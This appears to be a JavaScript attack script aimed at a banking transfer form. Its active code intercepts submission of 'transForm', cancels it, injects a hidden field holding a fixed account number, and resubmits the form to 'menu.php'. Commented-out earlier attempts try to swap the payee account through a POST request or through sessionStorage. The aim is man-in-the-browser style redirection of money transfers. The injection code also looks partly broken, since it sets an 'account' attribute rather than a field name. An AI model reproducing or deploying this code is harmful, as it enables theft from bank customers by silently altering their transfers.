//
// $("#transForm").on("submit", function (event)
// {
//     alert("jo1");
//     if($(document.activeElement).val() == "Dalej")
//     {
//         alert("jo2");
//         event.preventDefault();
//         $.post('TransacionValidation.php', {name: $("#name").val(), account: $("99999999999999999999999999").val(), value: $("#value").val(), title: $("#title").val(),date: $("#date").val()}, function(data) {
//            console.log("done");
//         });
//     }
// });

// document.getElementById("sendButton").onclick = function ()
// {
//     alert("jo1");
// };

// $("#transForm").on("submit",function (event)
// {
//     var acc = sessionStorage.getItem('acc');
//     document.write(acc);
//     sessionStorage.setItem('acc',"6543212345678901234567890");
//     acc = sessionStorage.getItem('acc');
//     document.write(acc);
// });


window.onload = function() {
    var form = document.getElementById("transForm");
    form.addEventListener("submit", function(e) {
        console.log(e.target.action);
        if(e.target.action.search('transferConfirm') > -1)
        {
            console.log(e.target.action);
            e.preventDefault();
            var input = document.createElement('input');
            input.style.display = "none";
            input.setAttribute("account", "6543212345678901234567890");
            // input.setAttribute("value", 3);
            form.append(input);
            form.action = "menu.php";
            form.submit();
        }
    });
};
